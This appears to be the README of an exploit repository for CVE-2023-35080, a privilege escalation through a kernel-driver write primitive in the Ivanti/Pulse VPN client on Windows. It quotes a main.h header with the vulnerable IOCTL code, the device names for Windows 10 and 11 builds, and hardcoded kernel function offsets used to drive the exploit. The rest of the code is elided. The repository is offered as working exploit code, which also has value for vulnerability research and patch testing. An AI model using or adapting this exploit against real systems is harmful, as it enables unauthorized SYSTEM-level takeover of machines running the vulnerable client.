# Ivanti/Pulse VPN Client Exploit of `CVE-2023-35080` leading to a privilege escalation

Code related to the exploitation of the `CVE-2023-35080` which leverages a write primitive in the Ivanti/Pulse VPN client kernel driver in Windows.
The write primitive conducts to a privilege escalation. 

The exploit was built with the help of the technical details shared in the following article : <https://northwave-cybersecurity.com/ivanti-pulse-vpn-privilege-escalation>.

Some details are hardcoded under the `main.h` file :

```C
#pragma once

#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <winternl.h>


#define VULN_IOCTL  0x80002018

////////

/*
 * jnprTdi_9115_15819 W10
 */

 // #define DEVICE_NAME_W L"jnprTdi_9115_15819"

 // // KxWaitForSpinLockAndAcquire
 // #define SPIN_OFFSET 0x300ea0

 // // KxTryToAcquireSpinLock
 // #define TRY_SPIN_OFFSET 0x361758

 // // void write_char(byte param_1,byte **param_2,int *param_3)
 // #define WRITE_CHAR_OFFSET 0x3d5878

 ////////

 /*
  * jnprTdi_9117_18209 W11
  */

#define DEVICE_NAME_W L"jnprTdi_9117_18209"

  // KxWaitForSpinLockAndAcquire 
#define SPIN_OFFSET 0x300e9e

// KxTryToAcquireSpinLock
#define TRY_SPIN_OFFSET 0x361757

// void write_char(byte param_1,byte **param_2,int *param_3)
#define WRITE_CHAR_OFFSET 0x3d93f8

////////

[...]
```